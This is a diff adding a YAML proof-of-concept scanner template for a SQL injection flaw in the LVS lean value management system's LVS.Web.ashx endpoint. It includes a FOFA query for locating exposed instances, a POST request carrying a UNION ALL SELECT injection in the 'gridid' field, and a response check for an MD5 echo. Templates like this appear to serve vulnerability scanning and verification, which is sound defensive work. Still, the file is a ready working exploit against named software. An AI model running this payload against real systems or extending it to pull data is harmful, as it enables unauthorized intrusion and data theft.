@@ -1,0 +1,22 @@
+id: poc-yaml-ji-la-ke-ji-lvs-web-ashx-sqli
+info:
+  name: LVS精益价值管理系统 LVS.Web.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: LVS精益价值管理系统
+  fofa: body="/ajax/LVS.Core.Common.STSResult,LVS.Core.Common.ashx"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /ajax/LVS.Web.AgencytaskList,LVS.Web.ashx?_method=GetColumnIndex&_session=r
+  headers:
+    Content-Type: text/plain; charset=UTF-8
+  data: 'src=AgencytaskList
+
+    gridid=1'' UNION ALL SELECT sys.fn_varbintohexstr(hashbytes(''MD5'',''{{.t1}}''))--'
+  expression: "status_code == 200 && \ncontains(body,t2) &&\ncontains(body,\"0x\"\
+    ) &&\n!contains(body,\"<\")\n"
+transport: http
